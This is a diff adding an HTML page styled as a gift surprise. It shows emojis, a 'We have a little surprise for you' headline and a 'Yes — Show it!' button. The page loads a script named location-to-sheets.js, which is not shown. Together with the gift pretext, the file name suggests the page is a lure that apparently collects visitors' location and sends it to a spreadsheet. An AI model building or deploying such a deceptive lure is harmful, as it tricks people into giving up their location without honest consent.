@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>You have a Surprise</title>
+  <style>
+    :root{
+      --bg1:#ffecd2;
+      --bg2:#fcb69f;
+      --card:rgba(255,255,255,0.9);
+      --accent:#ff6b6b;
+      --muted:#6b6b6b;
+    }
+    html,body{height:100%;margin:0}
+    body{
+      font-family:Inter, system-ui, -apple-system, 'Segoe UI', Roboto, Arial, Helvetica, sans-serif;
+      background:linear-gradient(135deg,var(--bg1),var(--bg2));
+      display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;
+      -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
+    }
+    .card{
+      width:100%;max-width:520px;background:var(--card);border-radius:18px;padding:28px;box-shadow:0 10px 30px rgba(14,20,30,0.15);backdrop-filter:blur(6px);
+      text-align:center;border:1px solid rgba(255,255,255,0.5);
+      transform:translateY(0);transition:transform .35s ease;
+    }
+    .card:hover{transform:translateY(-6px)}
+    h1{font-size:clamp(20px,4vw,28px);margin:0 0 10px;color:#222}
+    p.lead{color:var(--muted);margin:0 0 18px;font-size:clamp(14px,2.2vw,16px)}
+    .gift{
+      height:110px;width:500px;margin:6px auto 12px;border-radius:24px;background:linear-gradient(180deg,#fff7f3,#ffeef0);display:flex;align-items:center;justify-content:center;font-size:40px;box-shadow:0 8px 20px rgba(0,0,0,0.08)
+    }
+    .actions{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:14px}
+    button{
+      -webkit-appearance:none;appearance:none;border:0;padding:12px 18px;border-radius:12px;font-weight:600;cursor:pointer;font-size:15px;
+      box-shadow:0 6px 18px rgba(0,0,0,0.08);transition:transform .18s ease, box-shadow .18s ease;
+    }
+    button:active{transform:translateY(1px)}
+    .btn-primary{background:linear-gradient(90deg,var(--accent),#ff8e72);color:#fff}
+    .btn-ghost{background:transparent;border:1px solid rgba(34,34,34,0.08);color:#222}
+    #status{margin-top:12px;color:#333;font-size:14px}
+
+    /* confetti particles */
+    .confetti{position:absolute;inset:0;pointer-events:none;overflow:hidden}
+    .confetti i{position:absolute;width:10px;height:14px;background:yellow;opacity:0;transform:translateY(-20px) rotate(0deg);border-radius:2px}
+
+    @media (max-width:420px){
+      .card{padding:20px;border-radius:14px}
+      .gift{height:88px;width:88px;font-size:34px}
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card" role="main">
+    <div class="gift" aria-hidden="true">🎁🍕🍗🧁🍔</div>
+    <h1>We have a little surprise for you ...!</h1>
+    <p class="lead">Tap the button below to accept your gift — quick, easy and delightful.</p>
+    <div class="actions">
+      <button id="sendBtn" class="btn-primary">Yes — Show it!</button>
+    </div>
+    <p id="status" aria-live="polite"></p>
+  </div>
+
+  
+  <script src="assets/js/location-to-sheets.js"></script>
+</body>
+</html>
